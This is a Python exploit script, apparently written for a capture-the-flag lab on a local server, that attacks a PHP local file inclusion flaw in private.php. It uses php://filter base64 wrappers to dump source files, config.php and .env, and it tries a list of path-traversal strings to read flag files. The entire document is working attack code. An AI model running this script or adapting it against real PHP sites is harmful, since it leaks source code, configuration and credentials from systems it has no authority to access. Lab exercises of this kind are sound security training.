import requests
import base64
import re

TARGET = "http://127.0.0.1:33001"
endpoint = "/private.php"
base_url = f"{TARGET}{endpoint}"

print("="*80)
print("PHP FILTER WRAPPER - SOURCE CODE EXTRACTION")
print("="*80)

# Files to extract with PHP filter
FILES_TO_EXTRACT = [
    "index.php",
    "home.php", 
    "about.php",
    "contact.php",
    "login.php",
    "private.php",
    "config.php",
    "flag.php",
    "flag.txt",
    ".env",
]

found_flags = []
extracted_sources = {}

print("\n[+] Extracting PHP source code using php://filter wrapper...\n")

for filename in FILES_TO_EXTRACT:
    # Try different paths
    paths = [
        f"php://filter/read=convert.base64-encode/resource={filename}",
        f"php://filter/read=convert.base64-encode/resource=../../../var/www/html/{filename}",
    ]
    
    for path in paths:
        url = f"{base_url}?file={path}"
        
        try:
            resp = requests.get(url, timeout=10)
            
            # Try to decode base64
            try:
                decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                
                # Check for flag
                flags = re.findall(r'FLAG\{[^}]+\}', decoded)
                if flags:
                    print(f"\n[!] FLAG FOUND in {filename}: {flags}")
                    found_flags.extend(flags)
                
                # Store if valid PHP or interesting
                if "<?php" in decoded or "<?=" in decoded or "FLAG" in decoded or len(decoded) > 100:
                    print(f"\n[+] Successfully extracted: {filename}")
                    print(f"    Size: {len(decoded)} bytes")
                    if filename not in extracted_sources:
                        extracted_sources[filename] = decoded
                    
                    # Show snippet
                    print(f"    Snippet: {decoded[:300]}...")
                    break
                    
            except:
                pass
                
        except Exception as e:
            pass

# Now let's also test reading /flag directly with various path depths
print("\n" + "="*80)
print("DIRECT FLAG FILE TESTING")
print("="*80)

flag_paths = [
    "flag",
    "flag.txt", 
    "flag.php",
    "/flag",
    "/flag.txt",
    "/flag.php",
    "/home/flag",
    "/root/flag",
    "/tmp/flag",
    "../../../flag",
    "../../../../flag",
    "../../../../../flag",
    "../../../../../../flag",
    "../../../../../../../flag",
]

for fpath in flag_paths:
    url = f"{base_url}?file={fpath}"
    
    try:
        resp = requests.get(url, timeout=10)
        
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"\n[!] FLAG FOUND at {fpath}: {flags}")
            found_flags.extend(flags)
        
        # Check if response contains content that looks like a flag file
        text = re.sub(r'<[^>]+>', ' ', resp.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        # If response has content and is different from baseline
        if len(resp.text) > 1000 and "FLAG" not in text and "Content of" in text:
            content_match = re.search(r'Content of\s+\S+\s+(.*)', text, re.DOTALL)
            if content_match:
                content = content_match.group(1).strip()
                if len(content) > 20 and "root:" not in content:
                    print(f"\n[+] Interesting content from {fpath}:")
                    print(f"    {content[:500]}")
                    
    except Exception as e:
        pass

print("\n" + "="*80)
print("FINAL RESULTS")
print("="*80)

if found_flags:
    print(f"\n[!] FLAGS FOUND: {list(set(found_flags))}")
else:
    print("\n[-] No FLAG{} tokens found")

print(f"\n[+] Extracted {len(extracted_sources)} source files")
for fname in extracted_sources:
    print(f"    - {fname} ({len(extracted_sources[fname])} bytes)")
